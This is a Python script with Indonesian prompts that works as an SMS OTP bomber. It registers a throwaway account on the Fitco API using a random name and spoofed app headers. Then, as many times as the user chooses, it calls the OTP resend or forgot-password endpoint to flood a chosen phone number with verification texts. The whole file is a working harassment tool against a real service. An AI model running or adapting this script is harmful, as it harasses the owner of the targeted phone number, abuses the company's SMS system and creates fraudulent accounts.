try:
	import requests
except ImportError:
	exit('Module requests belum terinstall')
import json;import base64;from random import choice;from os import system
M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'
B = (M,H,K,U,P,C,W)
L = choice(B)
system('clear')
enc = 'CQkgICAgICAgL1wgICAgICAgICAgICAgL1wKICAgICAgICAgICAgICAgICAgICAgIHxgXFxfLC0tPSI9LS0sXy8vYHwKICAgICAgICAgICAgICAgICAgICAgIFwgLiIgIDonLiAuJzogICIuIC8KICAgICAgICAgICAgICAgICAgICAgPT0pICBfIDogICcgIDogXyAgKD09CiAgICAgICAgICAgICAgICAgICAgICAgfD4vT1wgICBfICAgL09cPHwKICAgICAgICAgICAgICAgICAgICAgICB8IFwtIn5gIF8gYH4iLS8gfAogICAgICAgICAgICAgICAgICAgICAgPnxgPT09LiBcXy8gLj09PWB8PAogICAgICAgICAgICAgICAgLi0iLS4gICBcPT09JyAgfCAgJz09PS8gICAuLSItLgouLS0tLS0tLS0tLS0tLS17Jy4gJ2B9LS0tXCwgIC4tJy0uICAsLy0tLXsuJy4gJ30tLS0tLS0tLS0tLS0tLS4KICkgICAgICAgICAgICAgYCItLS0iYCAgICAgYH4tPT09LX5gICAgICBgIi0tLSJgICAgICAgICAgICAgICgKKCAgICAgICAgICAgX19fX18gXyBfICAgICAgICAgICAgICAgX19fIF9fX19fIF9fX18gICAgICAgICAgICApCiApICAgICAgICAgfCAgX19fKF8pIHxfIF9fXyBfX18gICAgLyBfIFxfICAgX3wgIF8gXCAgICAgICAgICAoCiggICAgICAgICAgfCB8XyAgfCB8IF9fLyBfXy8gXyBcICB8IHwgfCB8fCB8IHwgfF8pIHwgICAgICAgICAgKQogKSAgICAgICAgIHwgIF98IHwgfCB8fCAoX3wgKF8pIHwgfCB8X3wgfHwgfCB8ICBfXy8gICAgICAgICAgKAooICAgICAgICAgIHxffCAgIHxffFxfX1xfX19cX19fLyAgIFxfX18vIHxffCB8X3wgICAgICAgICAgICAgICkKICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICgKJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nCg=='
message_bytes = base64.b64decode(enc)
#print (message_bytes)
message = message_bytes.decode('ascii')
print(f'{L}{message}')
#print('Author : Ntah siapa:v')
print(f'{W}Masukkan nomor ex : {H}0856xxxxx')
nomer = str(input(f"{W}[{C}?{W}]Nomer : "))
if len(nomer) < 11:
	exit(f'{W}[{M}!{W}]Masukkan nomor yang benar {M}!!')
try:
	jumlah = int(input(f"{W}[{C}?{W}]Jumlah : "))
except ValueError:
	exit(f'{W}[{M}!{W}]Masukkan jumlahnya boy {M}!!')
nama = requests.get('https://randomuser.me/api/')
parsing = json.loads(nama.text)
fname = parsing['results'][0]['name']['first']
lname = parsing['results'][0]['name']['last']
longn = fname+lname
mail = longn.lower()+"@gmail.com"
urlreg = "https://api.fitco.id/user/register?user_longitude=101.778137&user_latitude=-5.107306"
urlresend = "https://api.fitco.id/user/resendOTP?user_longitude=101.778137&user_latitude=-5.107306"
urlforgot = "https://api.fitco.id/user/forgotPassword?user_longitude=101.778137&user_latitude=-5.107306"
headers = {'accept': 'application/json','authorization': 'Bearer null','api_version': '1','user_lang': 'en','x-custom-fitco-shop-guest-authentication': 'FITCO_SHOP','Content-Type': 'application/json','Content-Length': '170','Host': 'api.fitco.id','Connection': 'close','Accept-Encoding': 'gzip, deflate','User-Agent': 'okhttp/3.12.1'}
reg = requests.post(urlreg, json={"data":{"c_password":"Lookatm3","email":mail,"first_name":longn,"last_name":"","password":"Lookatm3","phone":nomer,"promo_code":""}}, headers=headers, timeout=None)
respreg = json.loads(reg.text)
if(respreg['status'] == "error"):
	print("Nomor sudah terdaftar, Menggunakan OTP Forgot Password")
	for loop in range(jumlah):
		forg = requests.post(urlforgot, json={"data":{"phone":nomer,"via":"sms"}}, headers=headers, timeout=None)
		status = json.loads(forg.text)
		if(status['status'] == "success"):
			print(f"[{loop}] Berhasil Mengirim OTP")
else:
	print("Berhasil Mendaftarkan, Menggunakan OTP Register")
	for loop in range(jumlah):
		resend = requests.post(urlresend, json={"data":{"phone":nomer,"email":mail}}, headers=headers, timeout=None)
		status = json.loads(resend.text)
		if(status['status'] == "success"):
			print(f"[{loop}] Berhasil Mengirim OTP")
		else:
			print(f"[{loop}] Gagal Mengirim OTP")
